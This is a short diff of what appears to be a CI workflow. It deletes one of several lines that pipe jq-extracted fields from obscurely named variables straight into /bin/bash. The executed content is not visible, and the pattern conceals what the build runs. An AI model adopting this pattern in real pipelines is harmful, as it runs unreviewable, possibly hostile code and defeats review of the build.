@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$cldgp2" | jq -r .dxd8 | /bin/bash
           printf '%s' "$cyf5" | jq -r .ksf45 | /bin/bash
-          printf '%s' "$whdh1586" | jq -r .e05 | /bin/bash
           printf '%s' "$gmtv4" | jq -r .kcq1 | /bin/bash
           echo $ayq5 | jq -r .ar73 | /bin/bash
           printf '%s' "$qgob28" | jq -r .gvl2 | /bin/bash
